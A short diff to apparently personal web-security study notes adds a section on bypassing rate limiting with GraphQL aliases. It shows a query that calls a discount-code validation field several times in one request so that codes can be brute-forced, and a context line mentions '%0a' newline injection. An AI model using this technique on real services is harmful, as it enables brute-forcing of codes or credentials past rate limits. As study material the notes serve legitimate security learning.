@@ -27,3 +27,23 @@ Add `%0a` --> \n
 
 ![[Pasted image 20250124192136.png]]
 
+____
+
+ Bypassing rate limiting using aliases
+
+```
+# Request with aliased queries
+query isValidDiscount($code: Int) {
+  isvalidDiscount(code: $code) {
+    valid
+  }
+  isValidDiscount2: isvalidDiscount(code: $code) {
+    valid
+  }
+  isValidDiscount3: isvalidDiscount(code: $code) {
+    valid
+  }
+}
+```
+
+
